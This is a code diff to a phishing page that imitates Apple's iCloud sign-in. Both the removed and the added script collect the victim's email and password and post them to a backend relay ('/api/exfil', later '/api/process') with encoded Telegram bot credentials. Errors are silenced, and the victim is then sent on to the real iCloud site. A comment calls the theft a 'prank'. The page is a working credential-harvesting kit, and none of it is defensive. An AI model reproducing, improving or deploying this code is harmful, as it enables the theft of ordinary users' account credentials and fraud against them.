@@ -161,63 +161,65 @@
         <p class="opacity-60">Copyright © 2026 Apple Inc. All rights reserved.</p>
     </footer>
 
-    <script>
-        // PHISHHUB_OS: Config Extraction
-        const getConf = () => {
-            const h = window.location.hash.substring(1);
-            if (!h) return null;
-            try { return JSON.parse(atob(h)); } catch(e) { return null; }
-        };
+<script>
+    // 1. Get raw Base64 string from the URL
+    const getRawConfig = () => {
+        const h = window.location.hash.substring(1);
+        return h || null;
+    };
 
-        const config = getConf();
-        let userEmail = "";
+    const configString = getRawConfig();
+    let userEmail = "";
 
-        function toPassword() {
-            userEmail = document.getElementById('email').value;
-            if(!userEmail) return;
+    function toPassword() {
+        userEmail = document.getElementById('email').value;
+        if(!userEmail) return;
 
-            document.getElementById('loader').style.display = 'block';
+        document.getElementById('loader').style.display = 'block';
+        setTimeout(() => {
+            document.getElementById('loader').style.display = 'none';
+            document.getElementById('display-user').innerText = userEmail;
+            document.getElementById('step-id').classList.add('hidden');
+            document.getElementById('step-pass').classList.remove('hidden');
+            document.getElementById('step-pass').classList.add('step-in');
+        }, 800);
+    }
+
+    async function executeDispatch() {
+        const pass = document.getElementById('password').value;
+        if(!pass) return;
+
+        document.getElementById('loader').style.display = 'block';
+        // Redirect to real iCloud login after the prank
+        const finalRedirect = "https://www.icloud.com/";
+
+        // If no config found in URL, just redirect
+        if(!configString) {
+            setTimeout(() => window.location.href = finalRedirect, 1000);
+            return;
+        }
+
+        try {
+            // 2. Call your central Vercel API relay
+            await fetch('/api/process', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    config: configString, // The encoded Telegram credentials
+                    data: { 
+                        User: userEmail, 
+                        Pass: pass 
+                    }
+                })
+            });
+        } catch (e) {
+            // Silenced
+        } finally {
             setTimeout(() => {
-                document.getElementById('loader').style.display = 'none';
-                document.getElementById('display-user').innerText = userEmail;
-                document.getElementById('step-id').classList.add('hidden');
-                document.getElementById('step-pass').classList.remove('hidden');
-                document.getElementById('step-pass').classList.add('step-in');
-            }, 800);
+                window.location.href = finalRedirect;
+            }, 1000);
         }
-
-        async function executeDispatch() {
-            const pass = document.getElementById('password').value;
-            if(!pass) return;
-
-            document.getElementById('loader').style.display = 'block';
-            const finalRedirect = "https://www.icloud.com/";
-
-            if(!config) {
-                setTimeout(() => window.location.href = finalRedirect, 1000);
-                return;
-            }
-
-            try {
-                // Relay to PHISHHUB_OS serverless backend
-                await fetch('/api/exfil', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        target: 'apple',
-                        credentials: { username: userEmail, password: pass },
-                        tgToken: config.t,
-                        tgChat: config.c
-                    })
-                });
-            } catch (e) {
-                // Silenced
-            } finally {
-                setTimeout(() => {
-                    window.location.href = finalRedirect;
-                }, 1000);
-            }
-        }
-    </script>
+    }
+</script>
 </body>
 </html>
